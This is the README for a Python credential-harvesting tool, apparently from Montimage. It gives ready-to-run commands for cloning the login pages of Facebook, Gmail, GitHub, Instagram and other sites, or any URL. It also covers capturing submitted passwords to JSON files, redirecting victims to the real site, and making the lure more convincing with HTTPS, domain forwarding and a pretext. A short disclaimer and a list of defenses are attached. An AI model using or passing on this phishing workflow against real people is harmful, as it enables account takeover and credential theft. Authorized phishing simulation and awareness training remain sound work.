# Credential Harvester Attack Simulation

## Overview

Credential harvesting (also known as phishing) is a type of social engineering attack where attackers create fake login pages that mimic legitimate websites to steal user credentials. This script simulates a credential harvesting attack by cloning websites and capturing submitted login information.

This tool is designed for educational purposes and authorized security testing to help understand and defend against phishing attacks.

## Features

- Website cloning with customizable templates
- Form interception and credential capture
- Secure credential storage
- Detailed logging and statistics
- Multiple authentication form detection
- Predefined templates for common websites

## Requirements

- Python 3.6+
- Requests library
- BeautifulSoup4 library

## Installation

```bash
# Install required dependencies
pip install requests beautifulsoup4
```

## Usage

### Basic Attack

The simplest way to run a credential harvesting attack is to use a predefined template:

```bash
# Use the Facebook template
python credential_harvester.py -t facebook -p 8080
```

This will:
- Clone the Facebook login page
- Start a web server on port 8080
- Capture any credentials submitted to the fake login form

### Using Predefined Templates

The script comes with several predefined templates for common websites:

```bash
# Facebook template
python credential_harvester.py -t facebook -p 8080

# Twitter template
python credential_harvester.py -t twitter -p 8080

# LinkedIn template
python credential_harvester.py -t linkedin -p 8080

# Gmail template
python credential_harvester.py -t gmail -p 8080

# GitHub template
python credential_harvester.py -t github -p 8080

# Instagram template
python credential_harvester.py -t instagram -p 8080
```

### Cloning a Custom URL

You can also clone any website by specifying its URL:

```bash
# Clone a specific login page
python credential_harvester.py -u https://example.com/login -p 8080
```

### Customizing the Attack

#### Change the Port

To run the web server on a different port:

```bash
# Use port 3000
python credential_harvester.py -t facebook -p 3000
```

#### Set a Redirect URL

To redirect users to the legitimate site after capturing credentials:

```bash
# Redirect to the real Facebook after credential capture
python credential_harvester.py -t facebook -p 8080 -r https://www.facebook.com
```

#### Specify an Output File

To save captured credentials to a specific file:

```bash
# Save credentials to a custom file
python credential_harvester.py -t facebook -p 8080 -o /path/to/captured_creds.json
```

#### Bind to a Specific Address

By default, the server binds to all interfaces (0.0.0.0). To bind to a specific address:

```bash
# Bind to localhost only
python credential_harvester.py -t facebook -p 8080 -b 127.0.0.1
```

#### Enable Verbose Mode

For detailed output and debugging information:

```bash
python credential_harvester.py -t facebook -p 8080 -v
```

## Advanced Usage

### Creating a Complete Phishing Scenario

For a more realistic test, you might want to:

1. Set up domain forwarding to your server
2. Use HTTPS (you can use a reverse proxy like Nginx with Let's Encrypt)
3. Create a convincing pretext for the phishing attempt

Example with a custom domain and HTTPS (requires additional setup):

```bash
# Run the harvester on port 443 (HTTPS)
sudo python credential_harvester.py -t facebook -p 443 -r https://www.facebook.com
```

### Testing Different Form Types

Different websites use different authentication mechanisms:

```bash
# Test a simple username/password form
python credential_harvester.py -t github -p 8080

# Test a multi-step authentication form
python credential_harvester.py -t gmail -p 8080
```

## Accessing the Phishing Page

After starting the server, the phishing page can be accessed at:

```
http://<your-ip-address>:<port>/

# For example
http://192.168.1.100:8080/
```

## Viewing Captured Credentials

Captured credentials are saved to a JSON file in the `captured` directory. You can view them with:

```bash
# List captured credential files
ls -la captured/

# View the contents of a specific file
cat captured/credentials_20250515_123045.json
```

## Ethical Considerations

This tool should ONLY be used for:
- Educational purposes
- Authorized security testing
- Phishing awareness training

Unauthorized use against systems or individuals without explicit permission is illegal and unethical.

## Defensive Measures

Common defenses against phishing attacks include:

1. Security awareness training
2. Multi-factor authentication
3. Email filtering
4. Domain monitoring
5. Browser security extensions
6. URL inspection

Understanding these attacks helps in implementing proper defenses and training users.

## Command Line Options

```
-t, --template     Predefined template to use (choices: facebook, twitter, linkedin, gmail, github, instagram)
-u, --url          URL to clone (alternative to using a predefined template)
-p, --port         Port to run the web server on (default: 8080)
-r, --redirect     URL to redirect to after capturing credentials
-o, --output       File to save captured credentials
-b, --bind         Address to bind the web server to (default: 0.0.0.0)
-v, --verbose      Enable verbose output
```

## License

Proprietary - Montimage
